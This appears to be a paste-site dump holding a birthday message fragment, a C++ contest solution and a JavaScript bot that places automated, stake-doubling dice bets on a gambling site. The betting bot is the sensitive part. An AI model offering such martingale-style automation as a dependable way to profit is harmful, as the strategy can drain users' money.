Foodie her has a lazy cook inside, she'd starve herself and just stay alive with those random minimal foods, but she'd never make it. Her eyes, you can see how much dream she has in them, the entire world set on magic by her, the world where you can get lost into and just be happy.Love her, care her, treat her well, no matter what she is, she is the most imperfect perfection I've ever had in my life, and I adore her so much  and I hope someday she will she herself with the same sight I see her everyday with ❤️
In your presence, I find a sense of completeness and understanding that is rare and precious. Our bond is not bound by conventional labels; it is a deep, spiritual connection that defies definition 
Happy birthday, my dearest, and here's to more years of shared moments, deep understanding, and the unwavering care and kove  I hold in my heart. You are indeed someone very special to me, and I cherish the moments we've had together. Here's to you! 🎉🎂🥂❤️"
zaLZC4nD,++ snowybot update,coinwalk,JavaScript,Sunday 24th of September 2023 06:55:03 AM CDT,"var measly = parseFloat(document.getElementById('pct_balance').value);
var baby = Number((measly/80).toFixed(8));
var moon = baby;
var taget = 200000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 7;
var downer = 3;
var zoom = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 1;
var bill = true;
var zuel = parseFloat(document.getElementById('pct_balance').value);
var bart = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var lisa = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
 
function get(){
zuel = parseFloat(document.getElementById('pct_balance').value);
if ((zuel>(zoom+(moon*upper)))&&(zuel>=olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    mith = 2;
    zoom = parseFloat(zuel);
    measly = parseFloat(zuel);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>(zoom+(moon*upper)))&&(zuel<olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoom-(moon*downer)))&&(bill)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 2;
    mith = 0;
    bill = false;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoom-(moon*downer)))&&(!bill)) {
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if (moon>(measly/2)){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }     
    lisa = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
     if ((lisa > bart)&&(baboon)) {
var funeral = Number((zuel - measly).toFixed(8));
console.log(""profit"");
console.log(funeral); 
      baboon = false; 
       bart = parseFloat(lisa);
    }
    if ((lisa == bart)&&(!baboon)) { 
        baboon = true; 
        $('#pct_chance').val(49.5);
        $('#pct_bet').val(((moon*1).toFixed(8)));
        $('#a_lo').click();
    }
    setTimeout(() => get(), 1);
}
get();"
dFmSeTXr,Untitled,pedrocasdev,C++,Sunday 24th of September 2023 06:48:45 AM CDT,"/*
 * Author : pedrocas
 * Date   : 2023 Sep 24 11:44:35 AM
*/

#include <bits/stdc++.h>
 
using namespace std;
 
typedef long long ll;
const long long mod = 1000000007;
ll gcd (ll a, ll b) {return b==0 ? a : gcd(b, a%b);}
 
#define all(c) (c).begin(),(c).end()
#define pb push_back
#define mp make_pair
#define fastio ios_base::sync_with_stdio(false); cin.tie(nullptr);
 
const int di4[] = {-1, 0, 1,  0};
const int dj4[] = { 0, 1, 0, -1};
const int di8[] = {-1, 0, 1,  0, -1, 1,-1,1};
const int dj8[] = { 0, 1, 0, -1, -1, 1,1,-1};
 
const int maxn = 2e5 + 10;
const ll INF = 1e18;
 
int main()
{
#ifdef LOCAL
    freopen(""input.txt"", ""rt"", stdin);
    freopen(""output.txt"", ""wt"", stdout);
#endif
	fastio
	int tc = 1;
	//cin >> tc;
	while(tc-- ){
		int n, k;cin >> n >> k;
		vector<int> v[n];
		map<int, int> pos[n];
		for(int i = 0; i<n; i++){
			for(int j = 0, x; j<k; j++){
				cin >> x;
				v[i].pb(x);
				pos[i][x] = j;
			}
		}
		vector<int> b = v[0];
		vector<int> c[n];
		vector<int> mx(n + 1, 0);
		int cnt = 0, ans = 1;
		mx[1] = 1;
		for(int i = 0; i<k; i++){
			int el = b[i];
			bool ok = true;
			for(int j = 1; ok&&j<n; j++){
				if(c[j].size() == 0){
					c[j].pb(pos[j][el]);	
				}else{
					if(c[j].back() + 1 != pos[j][el]){
						ok = false; 
					}else{
						c[j].push_back(pos[j][el]);
					}
				}	
			}
			if(ok){
				ans = max(ans, ++cnt);
				mx[cnt]++;
			}else{
				cnt = 0;
				for(int j = 1; j< n; j++){
					c[j].clear();
				}
			}
		}
		if(ans == 1){
			cout << 1 << "" "" << mx[ans] <<endl;
		}else cout << ans << "" "" <<mx[ans]<<endl;
	}
	return 0;
}

"
